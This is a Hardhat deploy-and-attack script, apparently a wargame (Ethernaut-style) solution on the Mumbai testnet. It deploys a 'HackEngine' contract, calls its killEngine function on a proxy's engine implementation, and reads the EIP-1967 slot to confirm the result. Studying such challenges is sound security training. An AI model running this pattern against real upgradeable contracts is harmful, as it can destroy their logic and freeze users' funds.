const { ethers } = require("hardhat")
const { logTxResult } = require("../../utils/logTxResult")
const {
  abi: ABIIERC20,
} = require("../../artifacts/contracts/22/DEX.sol/IERC20.json")

require("dotenv").config()
const _provider = process.env.PROVIDER_MUMBAI
const privateKey = process.env.PRIVATE_KEY

const provider = new ethers.providers.JsonRpcProvider(_provider)
const signer = new ethers.Wallet(privateKey, provider)
const signerAddr = signer.address

/* @remind CHANGE addr */
const proxyAddr = "0xb7Ce256B188950C04A6fEF7581418E167799C482"
const EngineAddr = "0xecade2f85e37871e9bbbe280e94f50a713c120bf"

/* DEPLOY + ATTACK */
async function main() {
  /* CONTRACT NAME */
  const contractToDeploy = "HackEngine"
  const MyContract = await ethers.getContractFactory(contractToDeploy)
  /* @remind la private key va en hardhat.config.js */
  const HackEngineContract = await MyContract.deploy({
    gasLimit: 1000000,
  })
  console.log("HackEngineContract", HackEngineContract.address)

  const tx = await HackEngineContract.connect(signer).killEngine(EngineAddr, {
    gasLimit: 1000000,
  })
  const res = await tx.wait()
  logTxResult(res)

  /* check */
  const implementationAddress = await provider.getStorageAt(
    proxyAddr,
    "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
  )

  console.log("implementationAddress", implementationAddress)
}

main()
  .then(async (myContract) => {})
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })

/* 
  npx hardhat run contracts/25/DeployAndCall__Attack.js --network mumbai
*/
